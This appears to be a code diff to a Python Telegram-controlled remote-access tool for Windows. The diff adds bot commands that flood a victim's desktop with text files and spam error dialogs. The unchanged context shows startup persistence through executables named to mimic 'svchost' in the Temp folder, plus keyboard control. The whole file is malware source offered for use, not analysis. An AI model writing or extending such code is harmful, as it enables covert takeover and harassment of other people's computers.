@@ -10,35 +10,34 @@ import socket as st
 import random as ra
 import psutil as pt
 import getpass
+import subprocess as sp
+from tkinter import *
+from tkinter import messagebox as mb
 from time import sleep
 from tabulate import tabulate
 from pynput.keyboard import Key, Controller
 from PIL import Image, ImageTk
 from pathlib import Path
 
-if sys.version_info[0] == 2:
-    import Tkinter
-    tkinter = Tkinter
-else:
-    import tkinter
 
-
+root = Tk()
+root.withdraw()
 keyboard = Controller()
 Volume = True
 bot = tb.TeleBot(cfg.TOKEN)
 player = pg.media.Player()
 PCname = st.gethostname()
 USER_NAME = getpass.getuser()
-
+notdesktoppath = sp.check_output(r'powershell -command "[Environment]::GetFolderPath(\"Desktop\")"')
+desktoppath = notdesktoppath.decode().strip()
 
 def showPIL(pilImage):
-    root = tkinter.Tk()
     w, h = root.winfo_screenwidth(), root.winfo_screenheight()
     root.overrideredirect(1)
     root.geometry("%dx%d+0+0" % (w, h))
     root.focus_set()    
     root.bind("<Escape>", lambda e: (e.widget.withdraw(), e.widget.quit()))
-    canvas = tkinter.Canvas(root,width=w,height=h)
+    canvas = Canvas(root,width=w,height=h)
     canvas.pack()
     canvas.configure(background='black')
     imgWidth, imgHeight = pilImage.size
@@ -235,14 +234,53 @@ def autostart(message):
 	add_to_startup_bot("C:\Windows\Temp\svchostl.exe")
 	add_to_startup_watchdog("C:\Windows\Temp\svchostI.exe")
 
+@bot.message_handler(commands=["spamdesktop", "sd"])
+def spamdesktop(message):
+	filetitle = str(message.text.split()[1])
+	filetext = str(message.text.split()[2])
+	filecount = int(message.text.split()[3])
+	counter = 0
+	for counter in range(filecount):
+		desktoptxt = open(str(desktoppath) + "\\" + filetitle + str(counter+1) + ".txt", "w")
+		desktoptxt.write(filetext)
+		desktoptxt.close()
+		counter = counter + 1
+		sleep(0.2)
+	filetitle = None
+	filetext = None
+	filecount = None
+	counter = 0
+
+@bot.message_handler(commands=["spammessage", "smb"])
+def spammessage(message):
+	messagetitle = str(message.text.split()[1])
+	messagetext = str(message.text.split()[2])
+	messagecount = int(message.text.split()[3])
+	counter = 0
+	for counter in range(messagecount):
+		mb.showerror(messagetitle,messagetext)
+		counter = counter + 1
+		sleep(0.5)
+		if counter == messagecount and cfg.LANGUAGE == "RU":
+			bot.send_message(message.from_user.id, "Все окна закрыты!")
+		elif counter == messagecount and cfg.LANGUAGE == "EN":
+			bot.send_message(message.from_user.id, "All windows are closed!")
+
+	messagetitle = None
+	messagetext = None
+	messagecount = None
+	counter = 0
+
+root.destroy()
+root.mainloop()
 while True:
 	try:
 		bot.polling(none_stop=True)
 	except Exception as _ex:
 		if cfg.LANGUAGE == 'RU':
 			if cfg.DEBUG:
-				bot.send_message(message.from_user.id, "Ошибка: " + str(_ex))
+				bot.send_message(cfg.USERID, "Ошибка: " + str(_ex))
 		elif cfg.LANGUAGE == 'EN':
 			if cfg.DEBUG:
-				bot.send_message(message.from_user.id, "Error: " + str(_ex))
+				bot.send_message(cfg.USERID, "Error: " + str(_ex))
 		sleep(15)
